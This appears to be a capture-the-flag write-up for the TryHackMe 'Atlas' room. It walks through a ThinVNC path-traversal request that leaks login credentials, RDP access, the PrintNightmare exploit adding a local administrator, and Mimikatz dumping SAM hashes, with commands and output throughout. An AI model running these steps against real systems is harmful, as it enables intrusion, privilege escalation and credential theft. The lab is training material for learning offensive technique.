# Atlas


Type: Guided
Room Link: https://tryhackme.com/room/atlas

## Enumeration

IP: 10.10.208.37

Nmap

```
nmap -p- -v 10.10.208.37 -Pn

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

## Port 8080

ThinVNC

```
searchsploit thinvnc
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass                                            | windows/remote/47519.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

https://redteamzone.com/ThinVNC/

```
curl 'http://10.10.208.37:8080/../../../../../ThinVnc.ini' --proxy 127.0.0.1:8080
curl 'http://10.10.208.37:8080/asd/../../ThinVnc.ini' --path-as-is

[Authentication]
Unicode=0
User=Atlas
Password=H0ldUpTheHe@vens
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1
```

![image](https://user-images.githubusercontent.com/5285547/135341220-4180571f-aea9-4961-81cc-86dfb7caa1de.png)

Now we can login to the service 

![image](https://user-images.githubusercontent.com/5285547/135341483-7dc5da86-1647-4933-9c89-f679a1e70314.png)

```
Atlas:H0ldUpTheHe@vens
```

Connect to localhost pc

![image](https://user-images.githubusercontent.com/5285547/135341603-c419269b-8608-4188-8e47-4bc4e146512b.png)

![image](https://user-images.githubusercontent.com/5285547/135341615-ba41ba22-4a67-44e5-8cf3-216c47055b21.png)

## VNC

![image](https://user-images.githubusercontent.com/5285547/135342142-9b21efaf-eabd-4292-975b-2b5839cda61c.png)

```
xfreerdp /v:10.10.208.37 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:/tmp,share
```


## PrintNightmare by John Hammond and Caleb Stewart

https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1


```
Import-Module .\Nightmare.ps1
Invoke-Nightmare -NewUser "ac1d" -NewPassword "ac1d" -DriverName "PrintMe"

[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user ac1d as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

```
runas /user:ac1d powershell.exe
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential ac1d
```

## Mimikatz

Latest release

```
https://github.com/gentilkiwi/mimikatz/releases
```

cp to /tmp then run the mimikatz.exe

```
\\tsclient\share\mimikatz.exe

privilege::debug
token::elevate
```

![image](https://user-images.githubusercontent.com/5285547/135345106-0909339f-102a-4787-a4f8-63945e6d023b.png)

Dump the creds

```
lsadump::sam
```

Admin NTLM password hash

```
c16444961f67af7eea7e420b65c8c3eb
```
